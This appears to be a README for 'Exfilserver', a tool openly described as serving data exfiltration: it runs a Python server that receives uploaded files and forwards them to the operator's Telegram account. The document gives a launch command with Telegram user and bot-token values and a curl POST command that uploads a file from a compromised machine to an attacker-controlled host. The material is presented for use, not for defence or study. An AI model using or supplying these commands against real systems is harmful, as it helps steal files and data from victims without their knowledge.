## Exfilserver

> Data exfiltration via upload using curl or similar...
> Get the file directly on your telegram!

### Run:

```
python3 server.py -p 80 -f /tmp/files -tu 3030111111 -tt 2246422426:BBB-3aaah1xx99hQSC4uxxxxbu4nZilexxx
```

### Upload:

```
curl -X POST -F "file=@./file" http://<youhostname>:80/exf
```

_OBS: If the file is too large, the telegram will not be able to send it due to its limitations_